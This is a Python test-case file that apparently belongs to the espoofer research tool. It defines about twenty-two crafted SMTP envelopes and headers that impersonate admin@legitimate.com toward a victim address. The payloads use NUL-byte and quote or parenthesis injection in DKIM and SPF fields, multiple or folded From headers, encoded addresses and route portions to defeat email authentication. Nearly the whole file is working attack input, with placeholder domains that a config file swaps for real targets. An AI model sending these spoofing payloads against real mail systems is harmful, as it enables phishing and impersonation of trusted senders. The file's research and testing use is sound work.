from common.common import *
import config

# Important note:
#
# For server mode, all case_id should start with 'server_'.  All of attack.com, admin@legitimate.com, and victim@victim.com in thos cases will be replaced with the configured value in config.py.
# 
# For client mode, all case_id should start with 'client_'. attacker@example.com and admin@example.com in those cases will be replaced.
#

test_cases = {
    "server_a1": {
        "helo": b"helo.attack.com",
        "mailfrom": b"<any@mailfrom.notexist.legitimate.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <admin@legitimate.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A1: Non-existent subdomain\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Non-existent subdomains in MAIL FROM, refer to A1 attack in the paper."
    },
    "server_a2": {
        "helo": b"attack.com",
        "mailfrom": b"<(any@legitimate.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <ceo@legitimate.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A2: empty MAIL FROM address\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Empty MAIL FROM addresses, refer to A2 attack in the paper."
    },
    "server_a3": {
        "helo": b"33.attack.com",
        "mailfrom": b"<any@33.attack.com>",
        "rcptto": b"<victim@victim.com>",
        "dkim_para": {"d":b"legitimate.com", "s":b"selector._domainkey.attack.com.\x00.any", "sign_header": b"From: <admin@legitimate.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A3: NUL ambiguity\r\n",
            "body": b'Hi, this is a test message! Best wishes.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: multipart/alternative; boundary="001a113db9c28077e7054ee99e9c"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"NUL ambiguity, refer to A3 attack in the paper."
    },
    "server_a4": {
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        "dkim_para": {"d":b"legitimate.com'a.attack.com", "s":b"selector", "sign_header": b"From: <admin@legitimate.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A4: DKIM authentication results injection using single quote\r\n",
            "body": b'Hi, this is a test message! Best wishes.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: multipart/alternative; boundary="001a113db9c28077e7054ee99e9c"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"DKIM authentication results injection using single quote, refer to A4 attack in the paper."
    },
    "server_a5": {
        "helo": b"attack.com",
        "mailfrom": b"<any@legitimate.com(a.attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"legitimate.com(.attack.com", "s":b"selector", "sign_header": b"From: <ceo@legitimate.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A5: SPF authentication results injection using parenthese\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"SPF authentication results injection using parenthese, refer to A5 attack in the paper."
    },
    "server_a6": {
        "helo": b"attack.com",
        "mailfrom": b"<any@legitimate.com'@any.attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"legitimate.com(.attack.com", "s":b"selector", "sign_header": b"From: <ceo@legitimate.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A6: SPF authentication results injection 2\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"SPF authentication results injection 2, refer to Figure 5(f) attack in the paper."
    },
    "server_a7": {
        "helo": b"attack.com",
        "mailfrom": b"<@legitimate.com,@any.com:'any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"legitimate.com(.attack.com", "s":b"selector", "sign_header": b"From: <ceo@legitimate.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A7: routing address in mailfrom\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Routing address in MAIL FROM, a variant of A5 attack."
    },

    "server_a8": {
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"legitimate.com(.attack.com", "s":b"selector", "sign_header": b"From: <ceo@legitimate.com>"},
        "data": {
            "from_header": b"From: <first@attack.com>\r\nFrom: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A8: Multiple From headers\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Multiple From header, refer to Figure 6(a) in the paper."
    },

    "server_a9": {
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"legitimate.com(.attack.com", "s":b"selector", "sign_header": b"From: <ceo@legitimate.com>"},
        "data": {
            "from_header": b" From: <first@attack.com>\r\nFrom: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A9: Multiple From headers with preceding space\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Multiple From headers with preceding space, refer to section 5.1 in the paper."
    },
    "server_a10": {
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"legitimate.com(.attack.com", "s":b"selector", "sign_header": b"From: <ceo@legitimate.com>"},
        "data": {
            "from_header": b"From: <first@attack.com>\r\nFrom : <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A10: Multiple From headers with succeeding space\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Multiple From headers with succeeding space, refer to Figure 6(c) in the paper."
    },
    "server_a11": {
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"legitimate.com(.attack.com", "s":b"selector", "sign_header": b"From: <ceo@legitimate.com>"},
        "data": {
            "from_header": b"From\r\n : <first@attack.com>\r\nFrom: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A11: Multiple From headers with folding line\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Multiple From headers with folding line, refer to Figure 6(b) in the paper."
    },
    "server_a12": {
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"legitimate.com(.attack.com", "s":b"selector", "sign_header": b"From: <ceo@legitimate.com>"},
        "data": {
            "from_header": b"From\r\n : <first@attack.com>\r\nn",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A12: From and Sender header ambiguity\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n' + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"From and Sender header ambiguity, refer to Figure 6(d) in the paper."
    },
    "server_a13": {
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"legitimate.com(.attack.com", "s":b"selector", "sign_header": b"From: <ceo@legitimate.com>"},
        "data": {
            "from_header": b"From\r\n : <first@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A13: From and Resent-From header ambiguity\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Resent-From: <admin@legitimate.com>\r\n' + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"From and Resent-From header ambiguity, refer to section 5.1 in the paper."
    },
    "server_a14": {
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <first@legitimate.com>, <second@attack.com>"},
        "data": {
            "from_header": b"From: <first@attack.com>, <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A14: Multiple address in From header\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <s@sender.legitimate.com>\r\nContent-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Multiple address in From header, refer to Figure 8(a) in the paper."
    },
    "server_a15": { #works on yahoo_web, outlook_web
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"legitimate.com(.attack.com", "s":b"selector", "sign_header": b"From: <ceo@legitimate.com>"},
        "data": {
            "from_header": b"From:" + bs64encode(b"<admin@legitimate.com>")+ b",<second@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A15: Email address encoding\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <s@sender.legitimate.com>\r\nContent-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Email address encoding, refer to Figure 8(b) in the paper."
    },
    "server_a16": {
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'legitimate.com"=(.attack.com', "s":b"selector", "sign_header": b"From: <any@attack.com>"},
        "data": {
            "from_header": b"From: <@attack.com,@any.com:admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A16: Route portion\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <s@sender.legitimate.com>\r\nContent-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Route portion, refer to Figure 8(c) in the paper."
    },
    "server_a17": {
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'legitimate.com"=(.attack.com', "s":b"selector", "sign_header": b"From: <any@attack.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\,<second@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A17: Quoted pair\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <s@sender.legitimate.com>\r\nContent-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Quoted pair, refer to Figure 8(d) in the paper."
    },
    "server_a18": {
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'legitimate.com"=(.attack.com', "s":b"selector", "sign_header": b"From: <any@attack.com>"},
        "data": {
            "from_header": b"From: admin@legitimate.com,<second@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A18: Specical characters precedence\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <s@sender.legitimate.com>\r\nContent-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Specical characters precedence, refer to Figure 8(e) in the paper."
    },
    "server_a19": {
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'legitimate.com"=(.attack.com', "s":b"selector", "sign_header": b"From: <any@attack.com>"},
        "data": {
            "from_header": b"From: <any@attack.com>admin@legitimate.com\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A19: Display Name and real address parsing inconsistencies\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <s@sender.legitimate.com>\r\nContent-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Display Name and real address parsing inconsistencies, refer to Figure 8(f) in the paper."
    },



    "client_a1": {
        "helo": b"espoofer-MacBook-Pro.local",
        "mailfrom": b"<attacker@example.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"legitimate.com(.attack.com", "s":b"selector", "sign_header": b"From: <ceo@legitimate.com>"},
        "data": {
            "from_header": b"From: <attacker@example.com>\r\nFrom: <admin@example.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: client A1: Multiple From headers\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Spoofing via an email service account using multiple From headers, refer to section 6.2 in the paper."
    },   
    "client_a2": {
        "helo": b"espoofer-MacBook-Pro.local",
        "mailfrom": b"<attacker@example.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <first@legitimate.com>, <second@attack.com>"},
        "data": {
            "from_header": b"From: <attacker@example.com>, <admin@example.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: client A2: Multiple address in From header\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <s@sender.legitimate.com>\r\nContent-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Spoofing via an email service account using multiple address, refer to section 6.2 in the paper."
    },
    "client_a3": {
        "helo": b"espoofer-MacBook-Pro.local",
        "mailfrom": b"<attacker@example.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <first@legitimate.com>, <second@attack.com>"},
        "data": {
            "from_header": b"From: <admin@example.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: client A3: Spoofing via an email service account\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <s@sender.legitimate.com>\r\nContent-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Spoofing via an email service account, refer to section 6.2 in the paper."
    },
}
